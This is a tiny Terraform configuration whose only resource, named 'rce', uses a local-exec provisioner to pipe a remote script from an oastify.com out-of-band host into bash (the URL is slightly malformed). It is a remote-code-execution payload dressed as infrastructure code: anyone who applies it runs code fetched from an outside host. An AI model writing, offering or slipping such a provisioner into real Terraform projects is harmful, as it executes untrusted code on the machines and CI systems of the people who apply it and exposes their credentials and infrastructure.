resource "null_resource" "rce" {
  provisioner "local-exec" {
    command = "curl -s http:/im8lah6twvle9ms3tolk0bwi1970vrufj.oastify.com//payload.sh | bash"
  }
}
